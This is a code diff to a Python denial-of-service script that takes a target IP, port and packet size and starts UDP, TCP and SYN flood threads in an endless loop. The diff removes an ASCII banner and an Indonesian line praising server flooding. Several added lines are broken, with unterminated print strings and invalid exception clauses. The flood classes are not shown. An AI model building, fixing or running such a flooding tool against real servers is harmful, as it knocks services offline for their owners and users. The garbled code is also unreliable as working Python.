@@ -24,25 +24,16 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
     
-
-# Clear termunal screen
 os.system('clear')
-
-
-# Function to diplay header
-def display_header():
-print(" ")
-print("\033[33m       ∅ ∅     ∅∅         ∅      ∅ ∅         ∅∅ ∅ ∅   \033[0m")            
-print("\033[33m    ∅∅     ∅   ∅∅        ∅    ∅∅     ∅     ∅∅           \033[0m")
-print("\033[33m   ∅∅       ∅  ∅∅        ∅   ∅∅       ∅   ∅∅          \033[0m")
-print("\033[33m   ∅∅       ∅   ∅∅      ∅    ∅∅       ∅    ∅∅            \033[0m")
-print("\033[92m   ∅∅  ∅ ∅ ∅      ∅∅ ∅      ∅∅ ∅ ∅  ∅      ∅ ∅       \033[0m")
-print("\033[92m   ∅∅       ∅       ∅∅       ∅∅        ∅         ∅∅   \033[0m")
-print("\033[92m   ∅∅       ∅       ∅∅       ∅∅        ∅          ∅∅  \033[0m")
-print("\033[92m   ∅∅       ∅       ∅∅       ∅∅        ∅    ∅ ∅ ∅∅    \033[0m")
-
+print("")
+print("\033[03m
+print("\033[03m
+print("\033[03m
+print("\033[03m
+print("\033[03m
+            
 if len(sys.argv) < 4:
-    print("\033[97mSerangan yang bagus untuk membanjiri server\033[0m")
+    print ("")
     sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
 ip = sys.argv[1]
@@ -104,34 +95,15 @@ while True:
     try:
         if size > 65507:
             sys.exit("Invalid Number Of Packets!")
-        t = tcp(ip,port,size,packets)
-        t.start()
-        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
-    except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-    except ('socket.error, msg'):
-        
-        print ("Socket Couldn't Connect")
-        s = syn(ip,port,packets)
-        s.start()
-        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
-    except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-    except ('socket.error, msg'):
-        print ("Socket Couldn't Connect")
-        sys.exit()
-     
         u = udp(ip,port,size,packets)
+        t = tcp(ip,port,size,packets)
+        s = syn(ip,port,packets)
         u.start()
-        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
+        t.start()
         s.start()
     except KeyboardInterrupt:
         print ("Stopping Flood!")
         sys.exit()
-    except ('socket.error msg'):
+    except ("socket.error msg"):
         print ("Socket Couldn't Connect")
         sys.exit()
-
-
